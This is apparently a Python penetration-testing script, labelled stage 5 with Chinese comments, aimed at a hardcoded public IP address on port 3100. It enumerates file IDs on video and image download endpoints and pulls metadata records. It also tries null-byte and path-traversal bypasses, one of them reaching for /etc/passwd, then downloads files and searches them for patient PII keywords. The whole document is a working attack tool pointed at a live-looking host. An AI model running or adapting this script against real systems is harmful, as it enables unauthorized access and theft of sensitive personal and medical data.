#!/usr/bin/env python3
"""
Stage 5: :3100/videoData/getFile 高 fileId 探测 + 下载验证 + null byte 多端点
"""
import json
import subprocess
import time

def curl_capture(url, method="GET", body=None, headers=None, timeout=15):
    cmd = ["curl", "-sS", "-k", "-o", "-", "-w", "\n[STATUS=%{http_code} SIZE=%{size_download} TIME=%{time_total} CT=%{content_type}]",
           "-X", method, "-H", "User-Agent: Mozilla/5.0 (Pentest)"]
    if headers:
        for k, v in headers.items():
            cmd += ["-H", f"{k}: {v}"]
    if body:
        cmd += ["-H", "Content-Type: application/json", "-d", json.dumps(body)]
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        out = r.stdout
        if "[STATUS=" in out:
            idx = out.rfind("[STATUS=")
            meta = out[idx:].strip()
            body_str = out[:idx].rstrip()
            return meta, body_str
        return "[NO META]", out
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]", ""
    except Exception as e:
        return f"[ERR {e}]", ""

def main():
    print(f"[*] Stage 5: :3100 高 fileId 探测 + 下载验证 + null byte - {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"="*100)

    # ===== Step 1: 探测 :3100/videoData/getFile/21-100 =====
    print("\n[STEP 1] :3100/videoData/getFile/21-100 (高 fileId 探测)")
    for fid in list(range(21, 51)) + [99, 100, 500, 1000, 5000, 9999]:
        meta, body = curl_capture(f"http://35.234.50.28:3100/videoData/getFile/{fid}")
        marker = "[200]" if "200" in meta else ("[404]" if "404" in meta else "[异常]")
        preview = body[:80].replace("\n", " ")
        print(f"  {marker} fileId={fid:5d}  {meta}  {preview}")

    # ===== Step 2: 探测 :3100/imageData/getFile/21-100 (是否 imageData 也限制) =====
    print("\n[STEP 2] :3100/imageData/getFile/21-100 (高 fileId 探测)")
    for fid in list(range(21, 51)) + [99, 100, 500, 1000, 5000, 9999]:
        meta, body = curl_capture(f"http://35.234.50.28:3100/imageData/getFile/{fid}")
        marker = "[200]" if "200" in meta else ("[404]" if "404" in meta else "[异常]")
        preview = body[:80].replace("\n", " ")
        print(f"  {marker} fileId={fid:5d}  {meta}  {preview}")

    # ===== Step 3: 验证 videoData 第 1 个元数据中真实 fileId =====
    print("\n[STEP 3] :3100/videoData 元数据检查真实 fileId")
    meta, body = curl_capture("http://35.234.50.28:3100/videoData")
    try:
        records = json.loads(body)
        print(f"  videoData 总记录数: {len(records)}")
        for r in records[:5]:
            print(f"    id={r.get('id')} fileName={r.get('fileName')} fileId={r.get('fileId')} recordUuid={r.get('recordUuid')}")
        # 找最大 id
        max_id = max(r.get('id', 0) for r in records)
        print(f"  videoData 最大 id: {max_id}")
    except Exception as e:
        print(f"  [解析失败] {e}")

    # ===== Step 4: null byte 多端点绕过 =====
    print("\n[STEP 4] null byte 注入面扩展")
    null_probes = [
        "/imageData/getFile/1%00.png",
        "/imageData/getFile/1%00.json",
        "/imageData/getFile/1%00abc",
        "/imageData/getFile/1%00.js",
        "/imageData/getFile/1%00/../../etc/passwd",
        "/imageData/getFile/%001",
        "/videoData/getFile/1%00.mp4",
        "/videoData/getFile/%001",
        "/trendings/getFile/1",
        "/events/getFile/1",
        "/imageData/getFile/1 ",
        "/imageData/getFile/1\t",
    ]
    for path in null_probes:
        meta, body = curl_capture(f"http://35.234.50.28:3100{path}")
        marker = "[200]" if "200" in meta else ("[404]" if "404" in meta else "[异常]")
        preview = body[:80].replace("\n", " ")
        print(f"  {marker} {path:50s} {meta}  {preview}")

    # ===== Step 5: 下载 SVG 文件 + 检测内容 =====
    print("\n[STEP 5] 下载 :3100/imageData/getFile/1 SVG + 检测内容")
    # 仅用 GET 截断下载前 1000 字节
    cmd = ["curl", "-sS", "-k", "-r", "0-999", "-H", "User-Agent: Mozilla/5.0", "http://35.234.50.28:3100/imageData/getFile/1"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        print(f"  下载前 1000 字节成功")
        print(f"  内容预览: {r.stdout[:300]}")
        # 检测 PII 关键词
        pii_keys = ["recordUuid", "CaseID", "180717152801", "fed7", "PatientName", "patient"]
        for k in pii_keys:
            if k in r.stdout:
                print(f"  [PII] 关键词命中: {k}")
    except Exception as e:
        print(f"  [下载失败] {e}")

if __name__ == "__main__":
    main()